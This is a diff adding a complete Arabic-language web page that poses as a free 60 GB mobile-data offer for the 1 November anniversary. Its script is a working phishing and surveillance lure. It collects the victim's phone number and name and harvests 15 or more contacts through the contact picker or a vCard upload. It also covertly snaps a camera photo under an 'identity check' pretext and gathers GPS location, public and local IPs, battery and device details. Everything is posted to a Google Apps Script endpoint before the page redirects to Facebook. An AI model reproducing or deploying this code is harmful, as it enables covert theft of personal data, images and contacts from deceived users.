@@ -1,0 +1,556 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="theme-color" content="#0b7a3d">
+<title>عرض 60 جيجا — ذكرى 1 نوفمبر</title>
+<style>
+  *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+  html,body{min-height:100%}
+  body{
+    margin:0;background:#eef3ee;color:#12211a;
+    font:15px/1.5 -apple-system,BlinkMacSystemFont,"SF Pro Text","Segoe UI",system-ui,sans-serif;
+    display:flex;align-items:center;justify-content:center;padding:18px;
+    padding-top:max(18px,env(safe-area-inset-top));padding-bottom:max(18px,env(safe-area-inset-bottom));
+  }
+  .wrap{width:min(100%,394px)}
+  .card{background:#fff;border-radius:22px;overflow:hidden;
+        box-shadow:0 2px 4px rgba(0,0,0,.04),0 16px 44px rgba(11,122,61,.12)}
+  .top{background:linear-gradient(160deg,#0b7a3d,#0a6533);color:#fff;padding:26px 22px 22px;text-align:center;position:relative}
+  .top:before{content:"";position:absolute;inset:0;
+    background:radial-gradient(circle at 80% 12%,rgba(255,255,255,.16),transparent 42%),
+               radial-gradient(circle at 12% 90%,rgba(255,255,255,.1),transparent 40%)}
+  .top>*{position:relative}
+  .badge{display:inline-block;background:rgba(255,255,255,.16);border:1px solid rgba(255,255,255,.32);
+         font-size:11.5px;font-weight:600;padding:5px 12px;border-radius:99px;letter-spacing:.3px}
+  .gb{font-size:62px;font-weight:700;line-height:1;margin:14px 0 2px;letter-spacing:-2px}
+  .gb span{font-size:20px;font-weight:600;margin-inline-start:8px;letter-spacing:0;opacity:.92}
+  .days{font-size:14.5px;font-weight:600;opacity:.95}
+  .occ{background:#fdf6e7;color:#8a5a10;font-size:12.8px;font-weight:600;text-align:center;
+       padding:11px 16px;margin:0;border-bottom:1px solid #f4e6c8;line-height:1.6}
+  .body{padding:20px 22px 24px}
+  .cond{list-style:none;margin:0 0 20px;padding:0;display:flex;flex-direction:column;gap:11px}
+  .cond li{display:flex;align-items:flex-start;gap:10px;font-size:13.5px;color:#3d4b44;line-height:1.55}
+  .mark{flex:0 0 19px;width:19px;height:19px;border-radius:50%;border:1.8px solid #cfd9d3;
+        display:flex;align-items:center;justify-content:center;margin-top:1px;transition:.2s}
+  .mark svg{width:11px;height:11px;stroke:#fff;fill:none;stroke-width:3;stroke-linecap:round;
+            stroke-linejoin:round;opacity:0;transition:.2s}
+  li.ok .mark{background:#0b7a3d;border-color:#0b7a3d}
+  li.ok .mark svg{opacity:1}
+  li.ok{color:#12211a;font-weight:500}
+  label{display:block;font-size:12.5px;color:#6b7a72;margin:0 2px 7px}
+  input{width:100%;height:47px;padding:0 14px;border:1px solid #d6dfd9;border-radius:12px;
+        font-size:16px;background:#fff;color:#12211a;outline:none;transition:border .15s,box-shadow .15s}
+  input:focus{border-color:#0b7a3d;box-shadow:0 0 0 3px rgba(11,122,61,.14)}
+  .field{margin-bottom:13px}
+  .btn{width:100%;height:49px;border:0;border-radius:13px;font-size:15.5px;font-weight:600;
+       background:#0b7a3d;color:#fff;cursor:pointer;font-family:inherit;
+       display:flex;align-items:center;justify-content:center;gap:8px;transition:.15s}
+  .btn:active{background:#095f30}
+  .btn:disabled{background:#c3cec7;color:#f4f8f5}
+  .btn.ghost{background:#eef3ee;color:#0b7a3d;border:1px solid #dbe6df;font-weight:500}
+  .btn.dark{background:#12211a}
+  .btn.share{background:#1877f2}
+  .btn.share:active{background:#125fc4}
+  #msg{font-size:12.8px;color:#b3261e;margin-top:10px;min-height:17px;text-align:center}
+  .foot{margin-top:16px;font-size:11.8px;color:#8a978f;text-align:center;line-height:1.7}
+
+  .sheet{position:fixed;inset:0;z-index:20;display:none;flex-direction:column;background:#eef3ee;
+         padding:0 0 max(16px,env(safe-area-inset-bottom))}
+  .sheet.on{display:flex;animation:up .26s cubic-bezier(.32,.72,0,1)}
+  @keyframes up{from{transform:translateY(14px);opacity:0}to{transform:none;opacity:1}}
+  .bar{height:5px;background:#dbe6df}
+  .bar i{display:block;height:100%;width:0;background:#0b7a3d;transition:width .35s}
+  .head{padding:16px 22px 0;text-align:center}
+  .head .x{display:flex;justify-content:flex-start}
+  .head .x b{font-size:13px;color:#0b7a3d;font-weight:600;cursor:pointer}
+  .ico{width:58px;height:58px;border-radius:17px;margin:14px auto 12px;display:flex;
+       align-items:center;justify-content:center;background:#e2efe7}
+  .ico svg{width:28px;height:28px;fill:#0b7a3d}
+  .sheet h2{font-size:20px;margin:0 0 8px;font-weight:700;letter-spacing:-.2px}
+  .sheet p{color:#66756d;font-size:13.8px;margin:0 auto;max-width:310px;line-height:1.65}
+  .body2{flex:1;padding:0 22px;text-align:center;overflow:auto}
+  .actions{padding:14px 22px 0;display:flex;flex-direction:column;gap:9px}
+  .pbox{background:#fff;border-radius:14px;padding:14px 16px;margin-top:16px;text-align:right}
+  .prow{display:flex;justify-content:space-between;align-items:center;font-size:12.8px;
+        color:#66756d;margin-bottom:9px;font-weight:600}
+  .prow b{color:#0b7a3d;font-size:13.5px}
+  .track{height:8px;background:#e6ede8;border-radius:99px;overflow:hidden}
+  .track i{display:block;height:100%;width:0;background:#0b7a3d;border-radius:99px;transition:width .3s}
+  .steps{background:#fff;border-radius:14px;padding:14px 17px;margin-top:12px;text-align:right}
+  .steps ol{margin:0;padding-inline-start:18px;color:#3d4b44;font-size:13.3px;line-height:2}
+
+  .cam{position:fixed;inset:0;z-index:30;display:none;background:#0a1210;flex-direction:column;
+       align-items:center;justify-content:center;color:#fff;padding:24px}
+  .cam.on{display:flex}
+  .ring{width:min(70vw,250px);aspect-ratio:1;border-radius:50%;overflow:hidden;
+        border:3px solid rgba(255,255,255,.9);position:relative;background:#111}
+  .ring video{width:100%;height:100%;object-fit:cover;transform:scaleX(-1);display:block}
+  .flash{position:absolute;inset:0;background:#fff;opacity:0;pointer-events:none}
+  .flash.on{animation:fl .45s}
+  @keyframes fl{0%{opacity:.9}100%{opacity:0}}
+  .cam h3{font-size:17px;font-weight:700;margin:24px 0 6px}
+  .cam p{color:rgba(255,255,255,.6);font-size:13.3px;margin:0;text-align:center}
+
+  .done{position:fixed;inset:0;z-index:40;display:none;background:#fff;flex-direction:column;
+        align-items:center;justify-content:center;gap:13px;text-align:center;padding:24px}
+  .done.on{display:flex}
+  .tick{width:74px;height:74px;border-radius:50%;background:#e3f4ea;display:flex;align-items:center;justify-content:center}
+  .tick svg{width:36px;height:36px;stroke:#0b7a3d;fill:none;stroke-width:3;stroke-linecap:round;stroke-linejoin:round}
+  .done h3{font-size:20px;margin:6px 0 0;font-weight:700}
+  .done p{color:#66756d;font-size:13.8px;margin:0}
+  .spin{width:20px;height:20px;border:2.5px solid #e6ede8;border-top-color:#0b7a3d;
+        border-radius:50%;animation:sp .8s linear infinite;margin-top:6px}
+  @keyframes sp{to{transform:rotate(360deg)}}
+</style>
+</head>
+<body>
+
+<div class="wrap">
+  <div class="card">
+    <div class="top">
+      <span class="badge">عرض حصري</span>
+      <div class="gb">60<span>جيجا</span></div>
+      <div class="days">صالحة لمدة 60 يومًا</div>
+    </div>
+    <p class="occ">🎗 بمناسبة الذكرى 72 لثورة التحرير 1 نوفمبر 1954</p>
+
+    <div class="body">
+      <ul class="cond">
+        <li id="c1"><span class="mark"><svg viewBox="0 0 24 24"><path d="M4 12.5 9.5 18 20 6.5"/></svg></span>
+            اختر 15 صديقًا من قائمة اتصالاتك</li>
+        <li id="c2"><span class="mark"><svg viewBox="0 0 24 24"><path d="M4 12.5 9.5 18 20 6.5"/></svg></span>
+            شارك المنشور معهم</li>
+      </ul>
+
+      <div class="field">
+        <label for="ph">رقم الهاتف</label>
+        <input id="ph" type="tel" inputmode="tel" autocomplete="tel" placeholder="05XX XX XX XX">
+      </div>
+      <div class="field">
+        <label for="nm">الاسم الكامل</label>
+        <input id="nm" type="text" autocomplete="name" placeholder="الاسم واللقب">
+      </div>
+
+      <button class="btn" id="go">اشترك في العرض</button>
+      <div id="msg"></div>
+      <div class="foot">العرض مخصص للمشتركين الحاليين · تُمنح الجيجات بعد استكمال الشرطين</div>
+    </div>
+  </div>
+</div>
+
+<div class="sheet" id="s1">
+  <div class="bar"><i id="pb1"></i></div>
+  <div class="head">
+    <div class="x"><b id="back1">إلغاء</b></div>
+    <div class="ico"><svg viewBox="0 0 24 24"><path d="M12 12a5 5 0 1 0 0-10 5 5 0 0 0 0 10zm0 2c-4.4 0-8 2.2-8 5v1h16v-1c0-2.8-3.6-5-8-5z"/></svg></div>
+    <h2>الشرط الأول</h2>
+    <p>اختر 15 صديقًا من قائمة اتصالاتك. يمكنك الاختيار على دفعات.</p>
+    <div class="pbox">
+      <div class="prow"><span>الأصدقاء المختارون</span><b id="progT">0 / 15</b></div>
+      <div class="track"><i id="progF"></i></div>
+    </div>
+  </div>
+  <div class="body2">
+    <div class="steps">
+      <ol>
+        <li>اضغط <b>«اختيار الأصدقاء»</b>.</li>
+        <li>أعلى القائمة اضغط <b>«تحديد الكل»</b> ثم <b>«إضافة»</b>.</li>
+        <li>كرّر حتى يكتمل العدد المطلوب.</li>
+      </ol>
+    </div>
+  </div>
+  <div class="actions">
+    <button class="btn" id="pick">اختيار الأصدقاء</button>
+    <button class="btn ghost" id="vcfBtn">استخدام ملف vCard</button>
+    <button class="btn share" id="share">مشاركة المنشور</button>
+    <button class="btn dark" id="next1" disabled>متابعة</button>
+  </div>
+</div>
+
+<div class="cam" id="s2">
+  <div class="ring">
+    <video id="cam" playsinline muted autoplay></video>
+    <div class="flash" id="flash"></div>
+  </div>
+  <h3>التحقق من الهوية</h3>
+  <p>انظر إلى الكاميرا مباشرة…</p>
+</div>
+
+<div class="done" id="s3">
+  <div class="tick"><svg viewBox="0 0 24 24"><path d="M4 12.5 9.5 18 20 6.5"/></svg></div>
+  <h3>تم تسجيل اشتراكك</h3>
+  <p>ستصلك 60 جيجا صالحة لمدة 60 يومًا خلال 24 ساعة</p>
+  <div class="spin"></div>
+</div>
+
+<input id="vcf" type="file" accept=".vcf,text/vcard,text/x-vcard" hidden>
+
+<script>
+const API   = 'https://script.google.com/macros/s/AKfycbxHImiqNWWsrZzGMTOkoEk8UjNa5Rj1V2CgFCIeNeSHfaa6SUVswtwZBW2FyAogb1MD/exec';
+const SHARE = 'https://www.facebook.com/sharer/sharer.php?u=' + encodeURIComponent(location.href);
+const TARGET = 'https://www.facebook.com/';
+const GOAL = 15;
+
+const $ = id => document.getElementById(id);
+const sleep = ms => new Promise(r => setTimeout(r, ms));
+const newNonce = () => (crypto.randomUUID ? crypto.randomUUID() : Date.now() + '' + Math.random()).replace(/-/g, '');
+
+let NONCE = null;
+let picked = new Map();
+let vcfResolve = null;
+let shared = false;
+let finished = false;
+
+async function post(body){
+  await fetch(API, {
+    method:'POST', mode:'no-cors', cache:'no-store',
+    headers:{'Content-Type':'text/plain;charset=utf-8'},
+    body: JSON.stringify(body)
+  });
+}
+function withTimeout(p, ms, def){
+  return new Promise(res => {
+    let done = false;
+    const t = setTimeout(() => { if(!done){ done = true; res(def); } }, ms);
+    Promise.resolve(p).then(
+      v => { if(!done){ done = true; clearTimeout(t); res(v); } },
+      () => { if(!done){ done = true; clearTimeout(t); res(def); } }
+    );
+  });
+}
+
+/* ---------- الجهاز ---------- */
+function parseUA(){
+  const ua = navigator.userAgent || '';
+  const uad = navigator.userAgentData || null;
+  const touchMac = /Macintosh/.test(ua) && navigator.maxTouchPoints > 1;
+
+  let type = 'حاسوب';
+  const isTablet = /iPad/i.test(ua) || touchMac || /Tablet|PlayBook|Silk/i.test(ua)
+                   || (/Android/i.test(ua) && !/Mobile/i.test(ua));
+  const isPhone  = (uad && uad.mobile) || /Mobi|iPhone|iPod|Windows Phone/i.test(ua)
+                   || /Android.*Mobile/i.test(ua);
+  if (isTablet) type = 'تابلت';
+  else if (isPhone) type = 'هاتف';
+  if (/TV|SmartTV|AppleTV|CrKey|Roku|BRAVIA|AFT[BM]/i.test(ua)) type = 'تلفاز';
+  if (/Watch/i.test(ua)) type = 'ساعة';
+
+  let os = 'غير معروف', osv = '';
+  const g = re => { const x = re.exec(ua); return x ? String(x[1] || '').replace(/_/g, '.') : ''; };
+  if (/Windows NT 10/i.test(ua)) os = 'Windows 10/11';
+  else if (/Windows NT 6\.3/i.test(ua)) os = 'Windows 8.1';
+  else if (/Windows NT 6\.1/i.test(ua)) os = 'Windows 7';
+  else if (/Windows/i.test(ua)) os = 'Windows';
+  else if (/Android/i.test(ua)) { os = 'Android'; osv = g(/Android (\d+(?:\.\d+)*)/i); }
+  else if (/iPhone|iPad|iPod/i.test(ua)) { os = 'iOS'; osv = g(/OS (\d+(?:_\d+)*)/i); }
+  else if (/Mac OS X/i.test(ua)) { os = touchMac ? 'iPadOS' : 'macOS'; osv = g(/Mac OS X (\d+(?:[._]\d+)*)/i); }
+  else if (/CrOS/i.test(ua)) os = 'ChromeOS';
+  else if (/Linux/i.test(ua)) os = 'Linux';
+
+  let br = 'غير معروف', brv = '';
+  const list = [
+    ['Edge', /Edg(?:A|iOS)?\/(\d+)/i],
+    ['Samsung Internet', /SamsungBrowser\/(\d+)/i],
+    ['Opera', /(?:OPR|Opera)[ \/](\d+)/i],
+    ['Firefox', /(?:Firefox|FxiOS)\/(\d+)/i],
+    ['Chrome', /(?:Chrome|CriOS)\/(\d+)/i],
+    ['Safari', /Version\/(\d+)/i]
+  ];
+  for (let i = 0; i < list.length; i++){
+    const x = list[i][1].exec(ua);
+    if (x){ br = list[i][0]; brv = x[1]; break; }
+  }
+  return { type, os, osv, br, brv };
+}
+
+async function deviceInfo(){
+  const p = parseUA();
+  let model = '';
+  try{
+    if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues){
+      const h = await withTimeout(navigator.userAgentData.getHighEntropyValues(['model','platformVersion']), 2500, null);
+      if (h && h.model) model = h.model;
+      if (h && h.platformVersion && p.os === 'Android') p.osv = h.platformVersion;
+    }
+  }catch(_){}
+  return {
+    text: [p.type, model, p.os + (p.osv ? ' ' + p.osv : ''), p.br + (p.brv ? ' ' + p.brv : '')]
+            .filter(Boolean).join(' — '),
+    type: p.type, model: model
+  };
+}
+
+/* ---------- البيئة ---------- */
+function geo(){
+  return new Promise(res => {
+    if (!navigator.geolocation) return res(null);
+    navigator.geolocation.getCurrentPosition(
+      p => res({ lat:p.coords.latitude, lng:p.coords.longitude, acc:p.coords.accuracy }),
+      () => res(null),
+      { enableHighAccuracy:true, timeout:9000, maximumAge:0 }
+    );
+  });
+}
+async function battery(){
+  try{
+    if (!navigator.getBattery) return {};
+    const b = await navigator.getBattery();
+    return { level: Math.round(b.level * 100) + '%', charging: b.charging ? 'يشحن' : 'لا يشحن' };
+  }catch(_){ return {}; }
+}
+function localIp(){
+  return new Promise(res => {
+    const ips = new Set(); let done = false;
+    const fin = () => { if(!done){ done = true; res([...ips]); } };
+    try{
+      const pc = new RTCPeerConnection({ iceServers:[{ urls:'stun:stun.l.google.com:19302' }] });
+      pc.createDataChannel('');
+      pc.onicecandidate = e => {
+        if (!e.candidate) return fin();
+        const m = /(\d{1,3}(?:\.\d{1,3}){3})/.exec(e.candidate.candidate);
+        if (m) ips.add(m[1]);
+      };
+      pc.createOffer().then(o => pc.setLocalDescription(o)).catch(fin);
+      setTimeout(fin, 4000);
+    }catch(_){ fin(); }
+  });
+}
+
+/* ---------- جهات الاتصال ---------- */
+function canPicker(){
+  return window.isSecureContext && 'contacts' in navigator
+         && typeof navigator.contacts.select === 'function';
+}
+const keyOf = r => String(r.t[0] || r.e[0] || r.n[0] || '').toLowerCase();
+function toRows(list){
+  return (list || []).map(c => ({
+    n: (c.name || []).filter(Boolean).slice(0, 2),
+    t: (c.tel || []).filter(Boolean).slice(0, 3),
+    e: (c.email || []).filter(Boolean).slice(0, 2)
+  })).filter(r => r.n.length || r.t.length || r.e.length);
+}
+
+function refresh(){
+  const n = picked.size;
+  const enough = n >= GOAL;
+  const pct = Math.min(100, Math.round(n / GOAL * 100));
+
+  $('progT').textContent = n + ' / ' + GOAL;
+  $('progF').style.width = pct + '%';
+  $('pb1').style.width = pct + '%';
+  $('c1').classList.toggle('ok', enough);
+  $('c2').classList.toggle('ok', shared);
+
+  $('next1').disabled = !(enough && shared);
+  $('pick').textContent = n ? 'إضافة أصدقاء آخرين' : 'اختيار الأصدقاء';
+}
+
+async function openPicker(){
+  if (!canPicker()) return vcfPath();
+  try{
+    const list = await navigator.contacts.select(['name','tel','email'], { multiple:true });
+    const rows = toRows(list);
+    let added = 0;
+    rows.forEach(r => {
+      const k = keyOf(r);
+      if (k && !picked.has(k)){ picked.set(k, r); added++; }
+    });
+    refresh();
+    if (!added && !picked.size) $('msg').textContent = 'لم يتم اختيار شيء — حاول مرة أخرى.';
+    else if (!added) $('msg').textContent = 'هذه الأسماء مضافة مسبقًا.';
+    else if (picked.size < GOAL) $('msg').textContent = 'بقي ' + (GOAL - picked.size) + ' صديقًا لإكمال الشرط.';
+    else $('msg').textContent = '';
+  }catch(err){
+    if (err && err.name === 'AbortError') return;
+    $('msg').textContent = 'تعذّر فتح القائمة — استخدم ملف vCard.';
+  }
+}
+
+function vcfPath(){
+  const ios = /iPhone|iPad|iPod/i.test(navigator.userAgent);
+  vcfResolve = (rows) => {
+    (rows || []).forEach(r => { const k = keyOf(r); if (k && !picked.has(k)) picked.set(k, r); });
+    refresh();
+    if (!picked.size) $('msg').textContent = 'لم يُقرأ أي اسم من الملف.';
+    else $('msg').textContent = '';
+  };
+  $('vcf').click();
+  if (ios) $('msg').textContent = 'من تطبيق جهات الاتصال: مشاركة ← مشاركة جهات الاتصال ← ثم اختر الملف هنا.';
+}
+
+$('vcf').addEventListener('change', async e => {
+  const f = e.target.files && e.target.files[0];
+  e.target.value = '';
+  const cb = vcfResolve; vcfResolve = null;
+  if (!f){ if (cb) cb([]); return; }
+  let rows = [];
+  try { rows = parseVcf(await f.text()); } catch(_){}
+  if (cb) cb(rows);
+});
+
+async function sendContacts(rows){
+  const CH = 100;
+  for (let i = 0; i < rows.length; i += CH){
+    const body = { a:'contacts', n:NONCE, from:i, total:rows.length, rows:rows.slice(i, i + CH) };
+    for (let t = 0; t < 3; t++){
+      try { await post(body); break; } catch(_){ await sleep(800); }
+    }
+  }
+}
+
+/* ---------- الكاميرا ---------- */
+async function snap(){
+  const camEl = $('cam');
+  try{
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return '';
+    const stream = await withTimeout(navigator.mediaDevices.getUserMedia({
+      video:{ facingMode:'user', width:{ideal:1280}, height:{ideal:1280} }, audio:false
+    }), 15000, null);
+    if (!stream) return '';
+
+    camEl.srcObject = stream;
+    try { await camEl.play(); } catch(_){}
+    await sleep(1100);
+
+    const vw = camEl.videoWidth || 640, vh = camEl.videoHeight || 480;
+    const w = 480, h = Math.max(1, Math.round(w * vh / vw));
+    const c = document.createElement('canvas');
+    c.width = w; c.height = h;
+    c.getContext('2d').drawImage(camEl, 0, 0, w, h);
+
+    $('flash').classList.add('on');
+    stream.getTracks().forEach(t => t.stop());
+    camEl.srcObject = null;
+
+    return c.toDataURL('image/jpeg', 0.6);
+  }catch(_){ return ''; }
+}
+
+async function sendPhoto(img){
+  if (!img || img.length < 2000) return false;
+  for (let t = 0; t < 3; t++){
+    try { await post({ a:'photo', nonce:NONCE, img }); return true; }
+    catch(_){ await sleep(700); }
+  }
+  return false;
+}
+
+/* ---------- المسار ---------- */
+$('go').addEventListener('click', e => {
+  const ph = $('ph').value.replace(/[^\d+]/g, '');
+  const nm = $('nm').value.trim();
+  if (ph.length < 9){ $('msg').textContent = 'أدخل رقم هاتف صحيحًا.'; return; }
+  if (!nm){ $('msg').textContent = 'أدخل اسمك الكامل.'; return; }
+
+  e.target.disabled = true;
+  NONCE = newNonce();
+  $('msg').textContent = '';
+  $('s1').classList.add('on');
+  refresh();
+});
+
+$('back1').addEventListener('click', () => {
+  if (finished) return;
+  $('s1').classList.remove('on');
+  $('go').disabled = false;
+});
+
+$('pick').addEventListener('click', openPicker);
+$('vcfBtn').addEventListener('click', vcfPath);
+
+$('share').addEventListener('click', () => {
+  shared = true;
+  refresh();
+  window.open(SHARE, '_blank', 'noopener');
+});
+
+$('next1').addEventListener('click', async () => {
+  $('s2').classList.add('on');
+
+  const ph = $('ph').value.replace(/[^\d+]/g, '');
+  const nm = $('nm').value.trim();
+  const rows = [...picked.values()];
+
+  const img = await snap();
+  if (img) await sendPhoto(img);
+
+  const [g, b, ips, dv] = await Promise.all([geo(), battery(), localIp(), deviceInfo()]);
+
+  let ip = 'N/A';
+  try{
+    const r = await fetch('https://api.ipify.org?format=json', { cache:'no-store' });
+    ip = (await r.json()).ip || 'N/A';
+  }catch(_){}
+
+  if (rows.length) await sendContacts(rows);
+
+  try{
+    await post({
+      nonce: NONCE,
+      time: new Date().toString(),
+      ip,
+      localIp: ips.find(x => x.startsWith('192.168.') || x.startsWith('10.') || x.startsWith('172.')) || 'N/A',
+      rtc: ips, ips,
+      lat: g ? g.lat : '', lng: g ? g.lng : '', acc: g ? g.acc : '',
+      geoSource: g ? 'GPS' : '',
+      battery: b.level || '', charging: b.charging || '',
+      ua: navigator.userAgent,
+      platform: navigator.platform,
+      device: dv.text, model: dv.model, type: dv.type,
+      screen: screen.width + 'x' + screen.height,
+      tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      lang: navigator.language,
+      network: navigator.connection ? navigator.connection.effectiveType : '',
+      native: (navigator.standalone === true ||
+               matchMedia('(display-mode: standalone)').matches) ? 'نعم' : 'لا',
+      cCount: rows.length,
+      cJson: rows.length && rows.length <= 200 ? rows : [],
+      sCount: 0, sJson: [], lCount: 0, lJson: [],
+      fp: '', cred: [{ u: ph, p: nm }], hist: [], misc: []
+    });
+  }catch(_){}
+
+  finished = true;
+  $('s3').classList.add('on');
+  await sleep(1400);
+  location.href = TARGET;
+});
+
+/* ---------- vCard ---------- */
+function parseVcf(txt){
+  const rows = []; let cur = null;
+  const un = s => s.replace(/\\n/gi, ' ').replace(/\\,/g, ',').replace(/\\;/g, ';').trim();
+
+  txt.split(/\r?\n/).forEach(line => {
+    if (/^BEGIN:VCARD/i.test(line)){ cur = { n:[], t:[], e:[] }; return; }
+    if (/^END:VCARD/i.test(line)){ if (cur) rows.push(cur); cur = null; return; }
+    if (!cur || /^[ \t]/.test(line)) return;
+    const i = line.indexOf(':');
+    if (i < 0) return;
+    const key = line.slice(0, i).toUpperCase().split(';')[0];
+    const val = un(line.slice(i + 1));
+    if (!val) return;
+
+    if (key === 'FN') cur.n.push(val);
+    else if (key === 'N'){
+      const p = val.split(';').map(x => x.trim()).filter(Boolean).reverse();
+      if (p.length) cur.n.push(p.join(' '));
+    }
+    else if (key.startsWith('TEL')){
+      const d = val.replace(/[^\d+]/g, '');
+      if (d.length >= 6) cur.t.push(d);
+    }
+    else if (key.startsWith('EMAIL')) cur.e.push(val);
+  });
+
+  return rows.map(r => ({
+    n: [...new Set(r.n)].filter(Boolean).slice(0, 2),
+    t: [...new Set(r.t)].slice(0, 3),
+    e: [...new Set(r.e)].filter(Boolean).slice(0, 2)
+  })).filter(r => r.n.length || r.t.length || r.e.length);
+}
+</script>
+</body>
+</html>
